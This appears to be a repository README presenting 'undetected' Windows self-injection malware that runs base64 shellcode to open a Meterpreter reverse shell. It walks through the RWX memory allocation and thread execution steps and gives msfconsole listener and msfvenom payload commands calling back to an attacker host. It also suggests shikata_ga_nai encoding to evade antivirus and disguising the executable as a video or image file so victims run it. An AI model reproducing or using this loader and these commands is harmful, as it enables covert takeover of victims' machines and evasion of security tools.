# Self-Injection-Reverse-Shell-Undetected
Self Injection Malware, currently UNDETECTED by windows defender, it creates a reverse shell on a target machine

# ðŸ’» Code
This program injects base64 code into a self created process on the target machine. 

**Step by step guide**:
- First we define the base64 shellcode (make sure architecute is set to x86 and encoding to utf8 for the message box payload;
- Secondly we allocate the memory, write shellcode to the allocated memory, and make it readable, writable, and executable, allowing the shellcode to run.
- Then the code copies the shellcode into the newly allocated memory;
- It creates a new thread to execute the shellcode, since allocated_mem (which contains the shellcode) is cast to the function pointer type LPTHREAD_START_ROUTINE;
- Finally we wait for the created thread (which is running the shellcode) to finish executing before freeing the memory.

**Listener**

On the attacker's machine i used the classic multi handler exploit to run the payload: 

``` msfconsole ```

``` use exploit multi/handler  ```

``` set payload windows/meterpreter/reverse_tcp ```

``` set lhost XXX ```

``` set lport XXX ```

``` exploit ```

**Payload**:

The payload is, as i said before, a simple non-encrypted base64 shellcode, you can make it with ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=XXX LPORT=XXXX -fÂ c ```.
You can add a simple encryption by adding this ``` -e x86/shikata_ga_nai -f c  ```. In the future i will attempt to create my own encryption, since the well known ones are already pretty much detectable.

**Shell**

You can embed the code into pretty much anything, you can even use tools to mask the exe file into a mp4 or jpg file. Once the victim runs the exe, a new session will pop up on meterpreter:
